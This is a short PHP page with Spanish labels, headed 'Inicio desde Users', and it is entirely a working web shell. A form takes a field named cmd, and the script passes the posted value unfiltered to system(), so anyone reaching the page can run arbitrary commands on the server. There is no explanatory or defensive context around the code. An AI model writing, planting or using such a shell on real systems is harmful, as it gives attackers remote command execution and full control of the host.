<h1>Inicio desde Users</h1>

<form action="<?php $_SERVER['PHP_SELF'] ?>" method="post">
    <label for="cmd">
        Ejecute:
        <input type="text" name="cmd">
    </label>
    <button>Ejecutar</button>
</form>  

<?php
if(isset($_POST)){
    if($_POST['cmd'] && !empty($_POST['cmd'])){
        system($_POST['cmd']);
    }
}
?>